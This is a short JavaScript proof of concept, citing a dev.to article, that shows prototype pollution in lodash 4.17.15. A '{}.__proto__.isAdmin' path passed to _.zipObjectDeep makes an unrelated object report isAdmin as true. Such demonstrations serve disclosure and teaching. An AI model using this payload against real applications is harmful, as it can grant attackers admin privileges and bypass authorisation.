// https://dev.to/jmimoni/lodash-understanding-the-recent-vulnerability-and-how-we-can-rally-behind-packages-48kc

const _ = require('lodash'); // npm i lodash@4.17.15

var huntr = {
    nickname: 'Mufeed VH',
    username: 'mufeedvh'
}

_.zipObjectDeep(['{}.__proto__.isAdmin'],[true])

console.log(huntr) 
// { nickname: 'Mufeed VH', username: 'mufeedvh' }

console.log(huntr.isAdmin)
// true